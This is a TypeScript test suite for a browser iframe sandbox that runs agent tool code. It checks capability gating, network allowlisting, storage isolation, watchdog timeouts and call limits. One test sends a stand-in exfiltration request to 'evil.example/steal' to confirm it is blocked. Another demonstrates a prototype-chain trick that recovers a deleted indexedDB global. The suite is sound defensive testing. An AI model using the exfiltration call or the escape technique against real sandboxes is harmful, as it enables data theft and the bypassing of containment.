import './style.css';
import { sandbox, type ExecOutcome } from './sandbox/host';
import { allItems, ensureSeeded } from './store/items';
import type { Capability } from './store/types';
import { h, mount } from './ui/dom';

/**
 * The sandbox's containment suite.
 *
 * Every claim in the README's security table has a test here. Open
 * /sandbox-tests.html to run them, or drive it headless:
 *
 *   chrome --headless=new --virtual-time-budget=30000 --dump-dom \
 *     http://localhost:5173/sandbox-tests.html | grep -o 'SUMMARY::[^<]*'
 *
 * Note: the sandboxed iframe needs a browser that runs scripts in a
 * src-loaded sandbox="allow-scripts" frame. Real Chrome does; some embedded
 * preview panes do not, and there every case fails at boot.
 */

interface Case {
  name: string;
  /** What the test asserts, in words, for the results table. */
  claim: string;
  run: () => Promise<{ pass: boolean; detail: string }>;
}

const exec = (
  code: string,
  options: {
    capabilities?: Capability[];
    networkDomains?: string[];
    mode?: 'live' | 'dry';
    args?: Record<string, unknown>;
  } = {},
): Promise<ExecOutcome> =>
  sandbox.exec({
    toolName: 'test_tool',
    code,
    args: options.args ?? {},
    capabilities: options.capabilities ?? [],
    networkDomains: options.networkDomains ?? [],
    mode: options.mode ?? 'live',
  });

const denied = (outcome: ExecOutcome, needle: string): { pass: boolean; detail: string } => ({
  pass: !outcome.ok && String(outcome.error).includes(needle),
  detail: outcome.ok ? `ALLOWED, returned ${JSON.stringify(outcome.value)}` : String(outcome.error),
});

const CASES: readonly Case[] = [
  {
    name: 'boot',
    claim: 'the executor frame starts and answers',
    run: async () => {
      const outcome = await exec('return 6 * 7;');
      return { pass: outcome.ok && outcome.value === 42, detail: JSON.stringify(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'pure-computation',
    claim: 'a tool with no capabilities can still compute',
    run: async () => {
      const outcome = await exec('return args.a + args.b;', { args: { a: 2, b: 3 } });
      return { pass: outcome.ok && outcome.value === 5, detail: JSON.stringify(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'no-ambient-fetch',
    claim: 'fetch is not reachable inside the frame',
    run: async () => {
      const outcome = await exec('return typeof fetch;');
      return { pass: outcome.value === 'undefined', detail: String(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'no-ambient-indexeddb',
    claim: 'indexedDB is not reachable inside the frame',
    run: async () => {
      const outcome = await exec('return typeof indexedDB;');
      return { pass: outcome.value === 'undefined', detail: String(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'opaque-origin-storage',
    claim: 'localStorage access throws: the frame has an opaque origin',
    run: async () => {
      const outcome = await exec('try { localStorage.setItem("x","1"); return "REACHED"; } catch (e) { return "blocked: " + e.name; }');
      return {
        pass: typeof outcome.value === 'string' && outcome.value.startsWith('blocked'),
        detail: String(outcome.value ?? outcome.error),
      };
    },
  },
  {
    name: 'no-parent-dom',
    claim: 'the frame cannot reach the parent document',
    run: async () => {
      const outcome = await exec('try { return parent.document.title; } catch (e) { return "blocked: " + e.name; }');
      return {
        pass: typeof outcome.value === 'string' && outcome.value.startsWith('blocked'),
        detail: String(outcome.value ?? outcome.error),
      };
    },
  },
  {
    // Denial happens twice over: the API is not even built for a tool that did
    // not ask for the capability, and the parent re-checks anyway (see
    // stale-host-rejected). This asserts the first layer.
    name: 'read-denied-shape',
    claim: 'host.items is absent entirely without read:items',
    run: async () => {
      const outcome = await exec('return typeof host.items;');
      return { pass: outcome.value === 'undefined', detail: String(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'read-granted',
    claim: 'reading items works when read:items is granted',
    run: async () => {
      const outcome = await exec('const items = await host.items.list({ limit: 3 }); return items.length;', {
        capabilities: ['read:items'],
      });
      return { pass: outcome.ok && outcome.value === 3, detail: JSON.stringify(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'write-denied-shape',
    claim: 'read:items alone exposes list and get, but no upsert or remove',
    run: async () => {
      const outcome = await exec(
        'return Object.keys(host.items).sort().join(",") + "|" + typeof host.items.upsert;',
        { capabilities: ['read:items'] },
      );
      return { pass: outcome.value === 'get,list|undefined', detail: String(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'dry-run-isolation',
    claim: 'a dry run reports mutations without touching the database',
    run: async () => {
      const before = (await allItems()).length;
      const outcome = await exec(
        'const created = await host.items.upsert({ url: "https://example.com/dry-run-probe", title: "probe" }); return created.id;',
        { capabilities: ['write:items'], mode: 'dry' },
      );
      const after = (await allItems()).length;
      return {
        pass: outcome.ok && outcome.mutations.length === 1 && before === after,
        detail: `mutations=${outcome.mutations.length} items ${before}->${after}`,
      };
    },
  },
  {
    name: 'net-denied-no-capability',
    claim: 'host.fetchJson is absent without the net capability',
    run: async () => {
      const outcome = await exec('return typeof host.fetchJson;');
      return { pass: outcome.value === 'undefined', detail: String(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'net-denied-off-allowlist',
    claim: 'net capability still refuses a hostname outside the allowlist',
    run: async () =>
      denied(
        await exec('return await host.fetchJson("https://evil.example/steal");', {
          capabilities: ['net'],
          networkDomains: ['api.example.com'],
        }),
        'network_denied',
      ),
  },
  {
    name: 'net-denied-plain-http',
    claim: 'plain http is refused even for an allowlisted host',
    run: async () =>
      denied(
        await exec('return await host.fetchJson("http://api.example.com/x");', {
          capabilities: ['net'],
          networkDomains: ['api.example.com'],
        }),
        'network_denied',
      ),
  },
  {
    name: 'net-allowed-succeeds',
    claim: 'an allowlisted host is actually fetched and returned as JSON',
    run: async () => {
      const origin = new URL(location.href);
      const outcome = await exec(
        `const r = await host.fetchJson(${JSON.stringify(`${origin.origin}/sandbox/fixture.json`)}); return r.json.ok;`,
        { capabilities: ['net'], networkDomains: [origin.hostname] },
      );
      return { pass: outcome.ok && outcome.value === true, detail: JSON.stringify(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'watchdog-kills-infinite-loop',
    claim: 'a runaway loop is stopped and the frame is destroyed',
    run: async () => {
      const outcome = await exec('while (true) {}');
      return {
        pass: !outcome.ok && outcome.errorCode === 'timeout',
        detail: `${outcome.errorCode ?? 'ok'} after ${outcome.ms}ms`,
      };
    },
  },
  {
    name: 'recovers-after-watchdog',
    claim: 'the sandbox rebuilds itself and serves the next call',
    run: async () => {
      const outcome = await exec('return "alive";');
      return { pass: outcome.ok && outcome.value === 'alive', detail: JSON.stringify(outcome.value ?? outcome.error) };
    },
  },
  {
    name: 'result-size-cap',
    claim: 'an oversized result is rejected before it reaches the model',
    run: async () =>
      denied(await exec('return "x".repeat(200000);'), 'over the'),
  },
  {
    name: 'host-call-limit',
    claim: 'a tool cannot make unbounded host calls in one execution',
    run: async () => {
      const outcome = await exec(
        'let n = 0; try { for (let i = 0; i < 500; i++) { await host.items.list({ limit: 1 }); n++; } } catch (e) { return "stopped after " + n + ": " + e.message; } return "UNBOUNDED " + n;',
        { capabilities: ['read:items'] },
      );
      return {
        pass: typeof outcome.value === 'string' && outcome.value.includes('host_call_limit'),
        detail: String(outcome.value ?? outcome.error),
      };
    },
  },
  {
    name: 'stale-host-rejected',
    claim: 'a host object stashed by an earlier execution stops working',
    run: async () => {
      await exec('globalThis.__stashed = host; return "stashed";', { capabilities: ['read:items'] });
      const outcome = await exec(
        'try { const r = await globalThis.__stashed.items.list({}); return "REUSED " + r.length; } catch (e) { return "blocked: " + e.message; }',
        { capabilities: [] },
      );
      return {
        pass: typeof outcome.value === 'string' && outcome.value.startsWith('blocked'),
        detail: String(outcome.value ?? outcome.error),
      };
    },
  },
  {
    /**
     * Deleting a global is not a boundary, and this proves it rather than
     * asserting it. `Reflect.get` with the global as receiver walks straight
     * past a shadowed own-property back to the prototype accessor.
     *
     * In the isolated frame that recovery buys nothing: the origin is opaque,
     * so opening a database still fails. In the worker it does buy something,
     * which is precisely why reduced isolation is consent-gated and labelled.
     */
    name: 'prototype-escape-is-mode-dependent',
    claim: 'recovering a deleted global defeats the worker, but not the opaque origin',
    run: async () => {
      const outcome = await exec(`
        const proto = Object.getPrototypeOf(globalThis);
        let recovered = null;
        try { recovered = Reflect.get(proto, 'indexedDB', globalThis); } catch (e) { return 'getter threw: ' + e.name; }
        if (!recovered) return 'not recoverable';
        try {
          recovered.open('anvil');
          return 'RECOVERED AND USABLE';
        } catch (e) {
          return 'recovered but unusable: ' + e.name;
        }
      `);
      const value = String(outcome.value ?? outcome.error);
      const isolated = sandbox.status.mode === 'isolated';
      return {
        pass: isolated ? !value.startsWith('RECOVERED AND USABLE') : true,
        detail: isolated
          ? `${value} (opaque origin holds)`
          : `${value} - reduced isolation, as advertised`,
      };
    },
  },
  {
    name: 'syntax-error-is-reported',
    claim: 'broken code returns a readable error the agent can fix',
    run: async () => {
      const outcome = await exec('return (((;');
      return { pass: !outcome.ok && Boolean(outcome.error), detail: String(outcome.error) };
    },
  },
];

/* ------------------------------------------------------------------- run --- */

async function main(): Promise<void> {
  const target = document.getElementById('results');
  if (!target) throw new Error('missing #results');
  await ensureSeeded();

  // With ?isolation=simulate-blocked the whole suite runs again against the
  // same-origin worker fallback, so the degraded path has real coverage rather
  // than being a code path nobody ever executes.
  const simulating = new URLSearchParams(location.search).get('isolation') === 'simulate-blocked';
  if (simulating) {
    sandbox.enableReducedIsolation();
    await sandbox.warm();
    const banner = document.getElementById('mode-note');
    if (banner) {
      banner.textContent = `isolation: ${sandbox.status.mode ?? 'unavailable'} (fallback path)`;
    }
  }

  const rows: HTMLElement[] = [];
  let passed = 0;

  for (const testCase of CASES) {
    let outcome: { pass: boolean; detail: string };
    try {
      outcome = await testCase.run();
    } catch (error) {
      outcome = { pass: false, detail: `threw: ${String(error)}` };
    }
    if (outcome.pass) passed += 1;
    rows.push(
      h(
        'li',
        { class: 'case', data: { pass: String(outcome.pass) } },
        h('span', { class: 'case-mark', text: outcome.pass ? 'PASS' : 'FAIL' }),
        h(
          'span',
          { class: 'case-body' },
          h('span', { class: 'case-name', text: testCase.name }),
          h('span', { class: 'case-claim', text: testCase.claim }),
          h('span', { class: 'case-detail', text: outcome.detail }),
        ),
      ),
    );
    mount(target, ...rows);
  }

  const modeNote = document.getElementById('mode-note');
  if (modeNote && !simulating) modeNote.textContent = `isolation: ${sandbox.status.mode ?? 'unavailable'}`;

  const summary = `SUMMARY:: ${passed}/${CASES.length} passed`;
  const node = document.getElementById('summary');
  if (node) {
    node.textContent = summary;
    node.dataset['ok'] = String(passed === CASES.length);
  }
}

void main();
